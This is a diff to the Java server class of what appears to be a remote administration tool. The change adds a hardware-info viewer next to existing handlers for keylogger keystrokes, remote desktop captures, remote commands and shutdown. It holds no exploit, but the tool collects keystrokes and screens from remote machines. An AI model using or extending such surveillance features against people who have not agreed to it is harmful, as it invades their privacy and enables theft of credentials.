@@ -2,13 +2,11 @@ package Server;
 
 import Server.Exception.ClientDisconnectedException;
 import Server.GUI.*;
-import UI.CPU_Usage;
 import Ultils.MessageType;
 import Ultils.NetUtils;
 import Ultils.Packet;
 import org.jfree.data.time.DynamicTimeSeriesCollection;
 import org.jfree.data.time.Second;
-import oshi.SystemInfo;
 
 import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
@@ -24,7 +22,6 @@ import java.util.Base64;
 import java.util.Date;
 
 import javax.imageio.ImageIO;
-import javax.swing.*;
 
 
 public class ConnectedClient{
@@ -40,6 +37,7 @@ public class ConnectedClient{
     private GuiKeyLogger keylogger;
     private GuiCommand command;
     private GuiCPU cpu;
+    private Gui_HardwareInfo hardwareInfo;
 
     public ConnectedClient(Socket socket) throws IOException {
         this.lastIP = socket.getInetAddress().getHostAddress();
@@ -70,7 +68,7 @@ public class ConnectedClient{
                 Packet packet = NetUtils.readPacket(line);
                 if (packet.action == MessageType.GUI_TEXT.getID()) {
                     new GuiText(packet.data);
-                } else if (packet.action == MessageType.HARDWARE_INFO.getID()) {
+                } else if (packet.action == MessageType.CLIENT_INFO.getID()) {
                     this.os = packet.data.get(0);
                     this.userName = packet.data.get(1);
                     Server.getInstance().getGUI().updateInfo();
@@ -127,6 +125,37 @@ public class ConnectedClient{
                             this.desktop.setImage(i);
                         }
                     }
+                } else if (packet.action == MessageType.HARDWARE_INFO.getID()) {
+                    if (hardwareInfo == null) {
+                        hardwareInfo = new Gui_HardwareInfo(this);
+                    }
+                    if (this.hardwareInfo.isActive()) {
+                        System.out.println("Hardware info received: " + packet.data);
+                        if (packet.data != null) {
+                            String data;
+                            if (packet.data.get(0).equals("cpu")) {
+                                hardwareInfo.SetCPUText(packet.data.get(1));
+                            }
+                            if (packet.data.get(0).equals("disk")) {
+                                hardwareInfo.SetDiskText(packet.data.get(1));
+                            }
+                            if (packet.data.get(0).equals("display")) {
+                                hardwareInfo.SetDisplayText(packet.data.get(1));
+                            }
+                            if (packet.data.get(0).equals("disk")) {
+                                hardwareInfo.SetDiskText(packet.data.get(1));
+                            }
+                            if (packet.data.get(0).equals("gpu")) {
+                                hardwareInfo.SetGPUText(packet.data.get(1));
+                            }
+                            if (packet.data.get(0).equals("os")) {
+                                hardwareInfo.SetOSText(packet.data.get(1));
+                            }
+                            if (packet.data.get(0).equals("ram")) {
+                                hardwareInfo.SetRAMText(packet.data.get(1));
+                            }
+                        }
+                    }
                 } else if (packet.action == MessageType.KEYLOGGER.getID()) {
                     if (keylogger != null) {
                         keylogger.addKey(packet.data.get(0));
@@ -171,6 +200,13 @@ public class ConnectedClient{
             this.cpu = new GuiCPU(this);
         }
         this.cpu.setVisible(true);
+    }
+
+    public void OpenHardwareInfoView() {
+        if (this.hardwareInfo == null) {
+            this.hardwareInfo = new Gui_HardwareInfo(this);
+        }
+        this.hardwareInfo.setVisible(true);
     }
     public void SendShutDown(PrintWriter pw) {
         Packet packet = new Packet();
